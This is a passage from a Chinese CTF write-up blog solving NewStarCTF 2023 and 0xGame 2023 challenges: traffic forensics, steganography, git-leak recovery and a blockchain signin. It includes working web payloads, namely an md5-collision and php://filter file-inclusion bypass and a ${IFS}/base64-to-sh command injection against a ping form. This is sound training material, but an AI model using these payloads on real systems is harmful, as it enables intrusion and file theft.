class="code"><pre><code class="hljs plain">w3lc0m3&lt;SPACE&gt;to&lt;SPACE&gt;newstar&lt;SPACE&gt;ctf&lt;SPACE&gt;2023&lt;SPACE&gt;flag&lt;SPACE&gt;is&lt;SPACE&gt;here&lt;SPACE&gt;vbafjwrisgjadwwiihdgja13882hxbbbna     &lt;CAP&gt;&lt;CAP&gt;ff&lt;DEL&gt;lll&lt;DEL&gt;&lt;DEL&gt;aaa&lt;DEL&gt;&lt;DEL&gt;gggg&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&#123;999&lt;DEL&gt;&lt;DEL&gt;999&lt;DEL&gt;&lt;DEL&gt;11&lt;DEL&gt;9aaa&lt;DEL&gt;&lt;DEL&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;eb2---&lt;DEL&gt;&lt;DEL&gt;a450---&lt;DEL&gt;&lt;DEL&gt;2f5f&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;--&lt;DEL&gt;7bfc[unknown][unknown][unknown]-8989&lt;DEL&gt;&lt;DEL&gt;dfdf&lt;DEL&gt;&lt;DEL&gt;4bfa4bfa&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;85848584&#125;&#125;&#125;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&#125;]&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;nice&lt;SPACE&gt;work!1you&lt;SPACE&gt;got&lt;SPACE&gt;this&lt;SPACE&gt;flag<br>output :w3lc0m3&lt;SPACE&gt;to&lt;SPACE&gt;newstar&lt;SPACE&gt;ctf&lt;SPACE&gt;2023&lt;SPACE&gt;flag&lt;SPACE&gt;is&lt;SPACE&gt;here&lt;SPACE&gt;vbafjwrisgjadwwiihdgja13882hxbbbna     &lt;CAP&gt;FLAG&#123;9919AEB2-A450-2F5F-7BFC[UNKNOWN][UNKNOWN][UNKNOWN]-89DF4BFA8584&#125;]&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;NICE&lt;SPACE&gt;WORK!1YOU&lt;SPACE&gt;GOT&lt;SPACE&gt;THIS&lt;SPACE&gt;FLAG<br>flag&#123;9919aeb2-a450-2f5f-7bfc-89df4bfa8584&#125;<br></code></pre></td></tr></table></figure><h3 id="2-分析"><a href="#2-分析" class="headerlink" title="2-分析"></a>2-分析</h3><blockquote><p>但你心中仍然有一种不祥的预感，这时你的同事告诉你这台服务器已经被攻击者获取到了权限，需要你尽快去还原攻击者的攻击路径，调查清楚攻击者是如何获取到服务器权限的。；FLAG格式flag{md5(攻击者登录使用的用户名_存在漏洞的文件名_WebShell文件名)}；例如flag{testuser_123.php_shell.php}，将括号内的内容进行md5编码得到flag{58aec571c731faae1369b461d3927596}即为需要提交的Flag</p></blockquote><p>一般登录请求都是POST方式的请求，因此可以先过滤出所有的POST请求：</p><p>http &amp;&amp; http.request.method &#x3D;&#x3D; POST</p><p>可以看到有一个发送给&#x2F;api&#x2F;action&#x2F;login.php的POST请求中有username和password字段</p><p>其次是存在漏洞的文件名和WebShell文件名，可以看到有大量的目录扫描流量，先使用WireShark过滤器过滤掉响应状态码为404的响应：</p><p>http &amp;&amp; http.response.code !&#x3D; 404</p><p>响应格式是文件包含漏洞包含pearcmd.php GetShell的响应</p><p><img src="/2023/10/23/NewStarCTF2023/1698071032479.png" alt="1698071032479"></p><p>index.php文件的page参数存在任意文件包含漏洞，攻击者通过这个漏洞包含pearcmd.php向服务器中写入了名为wh1t3g0d.php的WebShell。</p><p>而后续的流量也可以看到攻击者是利用wh1t3g0d.php这个Shell执行了一些系统命令</p><p><img src="/2023/10/23/NewStarCTF2023/1697986650404.png" alt="1697986650404"></p><p><img src="/2023/10/23/NewStarCTF2023/1697986662607.png" alt="1697986662607"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">best_admin_index<span class="hljs-selector-class">.php_wh1t3g0d</span><span class="hljs-selector-class">.php</span><br>flag&#123;<span class="hljs-number">4069</span>afd7089f7363198d899385ad688b&#125;<br></code></pre></td></tr></table></figure><h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc"></a>Misc</h2><h3 id="R通大残"><a href="#R通大残" class="headerlink" title="R通大残"></a>R通大残</h3><p>题目附件黑不拉几一看，010看不出来，修改高度也没变化</p><p>想到RGB通道的R通道隐写，stegslove查看</p><p>果然上方有藏东西</p><p>单独提取R通道所有内容，得到flag</p><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><blockquote><p>请给出Nmap扫描得到所有的开放端口用英文逗号分隔，端口号从小到大排列。 例如flag{21,22,80,8080} nmap.pcap</p></blockquote><p>如果成功建立连接的话，服务器会发送一个<code>synack</code>字段</p><p>筛选一下<code>tcp.connection.synack</code></p><p><img src="/2023/10/23/NewStarCTF2023/1698305204342.png" alt="1698305204342"></p><p>flag{80,3306,5000,7000,8021,9000}</p><h3 id="依旧是空白"><a href="#依旧是空白" class="headerlink" title="依旧是空白"></a>依旧是空白</h3><p>给了两个附件，一个是图片，一个是txt文件</p><p>打开图片看不到什么，010查看crc报错，爆破宽高并修改</p><p>得到password:s00_b4by_f0r_y0u</p><p>这次是snow加密：</p><p>SNOW 是 the Steganographic Nature Of Whitespace 的简写。</p><p>SNOW 用于通过在行尾附加空格和制表符来隐藏 ASCII 文本中的消息，即<strong>文本隐写</strong>。由于空格和制表符在文本查看器中通常不可见，因此消息实际上对不经意的观察者隐藏。并且如果使用内置加密，即使检测到消息也无法读取。</p><table><thead><tr><th><strong>参数</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>-C</td><td>如果隐藏，则压缩数据，或者如果提取，则会解压缩。</td></tr><tr><td>-Q</td><td>静音模式。如果未设置，则程序报告统计信息，例如压缩百分比和可用存储空间的数量。</td></tr><tr><td>-S</td><td>报告文本文件中隐藏消息的近似空间量。考虑线长度，但忽略其他选项。</td></tr><tr><td>-p password</td><td>如果设置为此，则在隐藏期间将使用此密码加密数据，或在提取期间解密。</td></tr><tr><td>-l line-length</td><td>在附加空格时，Snow将始终产生比此值短的线条。默认情况下，它设置为80。</td></tr><tr><td>-f message-file</td><td>此文件的内容将隐藏在输入文本文件中。</td></tr><tr><td>-m message-string</td><td>此字符串的内容将被隐藏在输入文本文件中。请注意，除非在字符串中包含一个换行符，否则在提取邮件时，否则不会打印换行符。</td></tr></tbody></table><p><code>SNOW.EXE -C -p &quot;s00_b4by_f0r_y0u&quot; infile outfile</code></p><p>查看outfile里面的内容得到</p><p>flag{2b29e3e0-5f44-402b-8ab3-35548d7a6a11}</p><h3 id="3-溯源"><a href="#3-溯源" class="headerlink" title="3-溯源"></a>3-溯源</h3><blockquote><p>在调查清楚攻击者的攻击路径后你暗暗松了一口气，但是攻击者仍控制着服务器，眼下当务之急是继续深入调查攻击者对服务器进行了什么操作，同时调查清楚攻击者的身份，请你分析攻击者与WebShell通讯的流量获取攻击者获取的相关信息，目前可以得知的是攻击者使用了冰蝎进行WebShell连接。 Tip：沿着前序题目的进度分析会更符合逻辑，或许有助于解题 FLAG格式：flag{攻击者获取到的服务器用户名_服务器内网IP地址} 例如flag{web_10.0.0.3}</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0xGame2023</title>
    <link href="/2023/10/22/0xGameCTF2023/"/>
    <url>/2023/10/22/0xGameCTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p><img src="/2023/10/22/0xGameCTF2023/1697974933086-1697984030293-6.jpg" alt="1697974933086"></p><p>在<code>main.js</code>中</p><h3 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// flag in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> != <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-number">1024</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:</p><p>GET:<code>?a=s878926199a&amp;b=s155964671a</code></p><p>POST:<code>c=1024.5%00</code></p><p>Cookies:<code>name=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xGame</span>&#123;<span class="hljs-number">43</span>bb3e24-<span class="hljs-number">0824</span>-<span class="hljs-number">48</span>cb-<span class="hljs-number">95</span>d0-c471540c0953&#125;<br></code></pre></td></tr></table></figure><h3 id="hello-http"><a href="#hello-http" class="headerlink" title="hello_http"></a>hello_http</h3><p><img src="/2023/10/22/0xGameCTF2023/1697975089737-1697984176188-12.jpg" alt="1697975089737"></p><p>其中一开始不知道<code>Cookie</code>具体的name，后来抓包得到</p><p><img src="/2023/10/22/0xGameCTF2023/1697975118041-1697984209106-14.jpg" alt="1697975118041"></p><h3 id="repo-leak"><a href="#repo-leak" class="headerlink" title="repo_leak"></a>repo_leak</h3><p>提示是<code>git</code>源码泄露</p><p>使用<code>githack</code>或者<code>githacker</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">githacker --url http://124.71.184.68:50013/.git/ --output-folder resul<br></code></pre></td></tr></table></figure><p><img src="/2023/10/22/0xGameCTF2023/1697975167707-1697984243279-16.jpg" alt="1697975167707"></p><p>进入<code>.git</code>（需要<code>ls -a</code>，被隐藏了）</p><p><img src="/2023/10/22/0xGameCTF2023/1697975219332-1697984273011-18.jpg" alt="1697975219332"></p><p>使用<code>git</code>命令</p><p><code>git log</code>查看日志发现有一条添加了flag</p><p>git show 日志的hash</p><p><img src="/2023/10/22/0xGameCTF2023/1697975241720-1697984290635-20.jpg" alt="1697975241720"></p><p><img src="/2023/10/22/0xGameCTF2023/1697975252740-1697984294049-22.jpg" alt="1697975252740"></p><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>右键查看源码</p><p><img src="/2023/10/22/0xGameCTF2023/1697975351576-1697984341411-24.jpg" alt="1697975351576"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>  <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">sanitize</span>(<span class="hljs-variable">$ip</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="hljs-variable">$ip</span>)) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span>.<span class="hljs-variable">$ip</span>. <span class="hljs-string">&#x27; 2&gt;&amp;1&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>猜测是前端过滤</p><p><code>burpsuite</code>抓包</p><p><img src="/2023/10/22/0xGameCTF2023/1697975407741-1697984353455-26.jpg" alt="1697975407741"></p><p>发现过滤了空格和&#x2F;，用${IFS}代替空格，再利用base64绕过</p><p>payload：<code>ip=127.0.0.1|echo$&#123;IFS&#125;&#39;Y2F0IC4uLy4uLy4uL2ZsYWc=&#39;$&#123;IFS&#125;|$&#123;IFS&#125;base64$&#123;IFS&#125;-d$&#123;IFS&#125;|$&#123;IFS&#125;sh</code></p><p><img src="/2023/10/22/0xGameCTF2023/1697975418153-1697984360452-28.jpg" alt="1697975418153"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">R0I0RU9ZTE5NVjVWT1pMTU1NWUcyWks3S1JYVjZNRFlJNVFXMlpKU0dBWkRHSUpCUFU9PT09PT0=<br></code></pre></td></tr></table></figure><p>放厨子解密</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"><span class="hljs-number">0</span>xGame&#123;Welc0me_To_0xGame2023!!&#125;<br></code></pre></td></tr></table></figure><h3 id="重生之我在教学楼打CS"><a href="#重生之我在教学楼打CS" class="headerlink" title="重生之我在教学楼打CS"></a>重生之我在教学楼打CS</h3><blockquote><p>一眼”鼎”真，flag也许就在脚下</p></blockquote><p>下载CS1.6，把附件的<code>.bsp</code>添加到<code>cs-strike</code>的<code>maps</code>下面加载地图</p><p>进入游戏找到鼎</p><p><img src="/2023/10/22/0xGameCTF2023/1697975520664-1697984374424-30.jpg" alt="1697975520664"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">0xGame</span><span class="hljs-template-variable">&#123;CS_very_good&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Shark-shark"><a href="#Shark-shark" class="headerlink" title="Shark shark"></a>Shark shark</h3><p><img src="/2023/10/22/0xGameCTF2023/1697975612098-1697984386368-32.jpg" alt="1697975612098"></p><p>压缩包，复制值去厨子导出<code>out.zip</code>，发现打开需要密码</p><p><img src="/2023/10/22/0xGameCTF2023/1697975612110-1697984394803-34.jpg" alt="1697975612110"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">very_safe_password</span>`打开`out.zip<br><span class="hljs-attribute">0xGame</span>&#123;<span class="hljs-number">7</span>a504dab-ada6-<span class="hljs-number">4</span>c41-adb3-<span class="hljs-number">0</span>d1530098cd4&#125;<br></code></pre></td></tr></table></figure><h3 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h3><blockquote><p>Hint 1: 如果我的hide是steghide那你该如何seek呢</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide info <span class="hljs-string">&#x27;/home/kali/Desktop/a.jpg&#x27;</span> <br></code></pre></td></tr></table></figure><p><img src="/2023/10/22/0xGameCTF2023/1697975712571-1697984408503-36.jpg" alt="1697975712571"></p><p>猜测需要密码，使用<code>stegseek</code>进行爆破</p><p>stegseek a.jpg [wordlists]<br>不填wordlists，默认读取 &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</p><p><img src="/2023/10/22/0xGameCTF2023/1697975765382-1697984419967-38.jpg" alt="1697975765382"></p><p><img src="/2023/10/22/0xGameCTF2023/1697975765389-1697984425495-40.jpg" alt="1697975765389"></p><h3 id="least-and-most"><a href="#least-and-most" class="headerlink" title="least and most"></a>least and most</h3><blockquote><p>小明刚学会两种新的隐写方式，他来出个题考考你了 </p></blockquote><p>放到<code>stegsolve.jar</code>看看<code>RGB</code>的<code>000</code>和<code>777</code></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">0xGame</span><span class="hljs-template-variable">&#123;lsb_combined_with_msb&#125;</span><br></code></pre></td></tr></table></figure><h3 id="another-signin"><a href="#another-signin" class="headerlink" title="another signin"></a>another signin</h3><blockquote><p>典中典之一搜就会的年轻人的第一道区块链签到</p><p>题目(提供源码，nc访问) 124.220.8.243:20000</p><p>rpc(货币节点，添加至metamask) 124.220.8.243:8545</p><p>水龙头(提供货币，浏览器访问) 124.220.8.243:8080</p></blockquote><p>题目提示要搜索</p><p><a href="https://0314valen.github.io/article/2023-01-07-%E8%AE%B0%E4%B8%80%E4%B8%AABlockchain%E7%AD%BE%E5%88%B0%E9%A2%98%E7%9B%AE/#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87">记一个Blockchain签到题目</a></p><p><code>nc</code>查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc 124.220.8.243 20000<br></code></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">Can</span> <span class="hljs-selector-tag">you</span> <span class="hljs-selector-tag">make</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">isSolved</span>() <span class="hljs-selector-tag">function</span> <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">true</span>?<br><span class="hljs-selector-attr">[1]</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Create</span> <span class="hljs-selector-tag">an</span> <span class="hljs-selector-tag">account</span> <span class="hljs-selector-tag">which</span> <span class="hljs-selector-tag">will</span> <span class="hljs-selector-tag">be</span> <span class="hljs-selector-tag">used</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">deploy</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">challenge</span> <span class="hljs-selector-tag">contract</span><br><span class="hljs-selector-attr">[2]</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Deploy</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">challenge</span> <span class="hljs-selector-tag">contract</span> <span class="hljs-selector-tag">using</span> <span class="hljs-selector-tag">your</span> <span class="hljs-selector-tag">generated</span> <span class="hljs-selector-tag">account</span><br><span class="hljs-selector-attr">[3]</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Get</span> <span class="hljs-selector-tag">your</span> <span class="hljs-selector-tag">flag</span> <span class="hljs-selector-tag">once</span> <span class="hljs-selector-tag">you</span> <span class="hljs-selector-tag">meet</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">requirement</span><br><span class="hljs-selector-attr">[4]</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Show</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">contract</span> <span class="hljs-selector-tag">source</span> <span class="hljs-selector-tag">code</span><br><br>你能让<span class="hljs-selector-tag">isSolved</span>()函数返回<span class="hljs-selector-tag">true</span>吗?<br><span class="hljs-selector-attr">[1]</span> <span class="hljs-selector-tag">-</span>创建将用于部署挑战合约的帐户<br><span class="hljs-selector-attr">[2]</span> <span class="hljs-selector-tag">-</span>使用生成的帐户部署挑战合约<br><span class="hljs-selector-attr">[3]</span> <span class="hljs-selector-tag">-</span>一旦你达到要求，就拿到你的旗子<br><span class="hljs-selector-attr">[4]</span> <span class="hljs-selector-tag">-</span>显示合同的源代码<br><br><span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">input</span> <span class="hljs-selector-tag">your</span> <span class="hljs-selector-tag">choice</span>: <span class="hljs-number">1</span><br><span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">deployer</span> <span class="hljs-selector-tag">account</span>: <span class="hljs-number">0</span><span class="hljs-selector-tag">x3b7a000BD89B029393C3064d85E637A9126Ee78A</span><br><span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">token</span>: <span class="hljs-selector-tag">v4</span><span class="hljs-selector-class">.local</span><span class="hljs-selector-class">.A12sTjkitDKVQFxC220nVoxO45r4Utez7FO6u6eDBHledcBoLln0sW-aEU1ZXc6z2HFemRIASBwqaqYs-vnX6f2vq1kHoV1mHkSxquwGcMSI3oZDAyItFVcTYvpp_v5I6FKT_f0kc-DLseX--ZoBLaxIxkGxAp5PNIgr5rEfTEVRHw</span><span class="hljs-selector-class">.R3JlZXRlcg</span><br><span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">please</span> <span class="hljs-selector-tag">transfer</span> <span class="hljs-selector-tag">more</span> <span class="hljs-selector-tag">than</span> <span class="hljs-number">0.001</span> <span class="hljs-selector-tag">test</span> <span class="hljs-selector-tag">ether</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">deployer</span> <span class="hljs-selector-tag">account</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">next</span> <span class="hljs-selector-tag">step</span><br>要转<span class="hljs-number">0.001</span>到账户中<br><br><br></code></pre></td></tr></table></figure><p>使用<code>水龙头</code>领取<code>测试币</code></p><p><img src="/2023/10/22/0xGameCTF2023/1697975945186-1697984459570-42.png" alt="1697975945186"></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs csharp">得到<br>[+] contract address: <span class="hljs-number">0x70542C6d259fff7bB329B077Ea7131e08A242645</span><br>[+] transaction hash: <span class="hljs-number">0x69e3dcbe94e686d936c06750578ebe3ce3c6b70198c6ec8632d191d2df770d52</span><br><br>然后输入<span class="hljs-number">4</span>查看源码<br><br>contracts/Example.sol<br><span class="hljs-comment">// SPDX-License-Identifier: UNLICENSED</span><br>pragma solidity <span class="hljs-number">0.8</span><span class="hljs-number">.9</span>;<br><br>contract Greeter &#123;<br>    <span class="hljs-built_in">string</span> greeting;<br><br>    constructor(<span class="hljs-built_in">string</span> memory _greeting) &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    <span class="hljs-function">function <span class="hljs-title">greet</span>() <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">string</span> memory</span>)</span> &#123;<br>        <span class="hljs-keyword">return</span> greeting;<br>    &#125;<br><br>    <span class="hljs-function">function <span class="hljs-title">setGreeting</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> memory _greeting</span>) <span class="hljs-keyword">public</span></span> &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    <span class="hljs-function">function <span class="hljs-title">isSolved</span>() <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">bool</span></span>)</span> &#123;<br>        <span class="hljs-built_in">string</span> memory expected = <span class="hljs-string">&quot;Love0xGame&quot;</span>;<br>        <span class="hljs-keyword">return</span> keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们需要使<code>keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));</code>，其中<code>expected</code>的值是<code>Love0xGame</code>，所以我们只需要将<code>greeting</code>的值也设置成<code>Love0xGame</code>即可满足加密。</p><p>使用<code>chrome</code>插件<code>metamask</code></p><p><img src="/2023/10/22/0xGameCTF2023/1697975990515-1697984468753-44.png" alt="1697975990515"></p><p>添加网络，其中网络名称随便写，rpc填题目的第二个rpc地址，链id填错会告诉你正确的，照着填就行，货币符号自己随便。</p><p>在浏览器搜索remix并打开，在<code>contracts</code>文件夹下新建<code>Example.sol</code>，复制源码</p><p><img src="/2023/10/22/0xGameCTF2023/image-20231022200017329-1697984560876-52.png" 